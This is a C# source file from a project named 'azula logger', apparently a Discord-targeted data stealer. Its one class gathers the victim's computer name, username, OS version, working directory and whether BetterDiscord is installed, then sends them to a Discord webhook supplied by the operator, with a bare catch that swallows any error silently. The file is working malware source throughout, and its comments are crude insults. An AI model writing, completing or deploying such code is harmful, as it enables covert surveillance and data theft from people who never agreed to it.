using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace azula_logger
{
    class wininfo
    {
        public static void GetWinInfo(string webhook, string image)
        {
            try
            {
            //getting all the info (just read it u fat retard)
            string BetterDiscordI;
            string CurrentDir = Environment.CurrentDirectory;
            string PCName = Environment.MachineName;
            string UserName = Environment.UserName;
            string OSVersion = (Environment.OSVersion.ToString());

            string BetterDiscordDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\BetterDiscord";
            //checking if the person has betterdiscord 
            if (Directory.Exists(BetterDiscordDir))
            {
                BetterDiscordI = "true";
            }
            else
            {
                BetterDiscordI = "false";
            }
            //sending webhook
            websend.sendDiscordWebhook(webhook, "azula logger", "Name: \n" + PCName + "\n\nUsername: \n" + UserName + "\n\nOS Version: \n" + OSVersion + "\n\nBetterDiscord: \n" + BetterDiscordI + "\n\nCurrent dir: \n" + CurrentDir + "\n -------------------------", image);
            }
            catch { }
        }
    }
}
